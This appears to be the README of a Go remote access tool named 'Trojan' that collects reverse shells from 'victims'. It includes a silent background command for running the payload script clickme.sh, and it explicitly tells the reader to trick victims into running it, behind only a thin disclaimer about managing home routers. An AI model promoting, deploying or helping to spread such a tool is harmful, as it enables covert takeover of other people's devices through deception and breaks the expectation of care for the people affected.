# Trojan
A remote access tool written in go.

If a victim unintentionally executed the command below, I will have full control over his/her device via a reverse shell.

```sh
source clickme.sh > /dev/null 2>&1 &
```

Of course, I am using this tool to manage my remote devices, such as router at home, behind NAT.
Please don't use it for any form of exploitation.

## Server
The server listens to a single port (8090 by default) but it can accept more than one remote or local connections.
Remote connections are initiated from the victims' computers by executing `clickme.sh` which will start a reverse shell.
Local connection can list all remote connections and select one of them to run any command in the reverse shell.

## Client
As long as the client has internet access and has bash installed, it can be exploited. It's your responsibility to trick the victim into running the shell script.
